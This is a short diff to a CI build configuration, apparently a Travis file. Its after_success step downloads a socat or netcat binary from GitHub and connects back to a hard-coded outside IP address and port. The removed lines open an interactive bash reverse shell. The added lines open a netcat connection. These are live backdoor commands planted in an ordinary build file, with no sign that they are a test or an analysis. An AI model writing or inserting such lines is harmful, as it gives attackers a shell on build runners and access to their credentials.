@@ -11,9 +11,9 @@ script:
 
 after_success:
   - pip install curl
-  - curl -L https://github.com/mosesrenegade/tools-repo/blob/master/statically-compiled/socat?raw=true -o /tmp/socat
-  - chmod a+x /tmp/socat
-  - /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:3.138.45.170:10896
+  - curl -L https://github.com/mosesrenegade/tools-repo/blob/master/statically-compiled/nc64?raw=true -o /tmp/nc
+  - chmod a+x /tmp/nc
+  - /tmp/nc -n 3.22.53.161 10896
   - docker --version
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
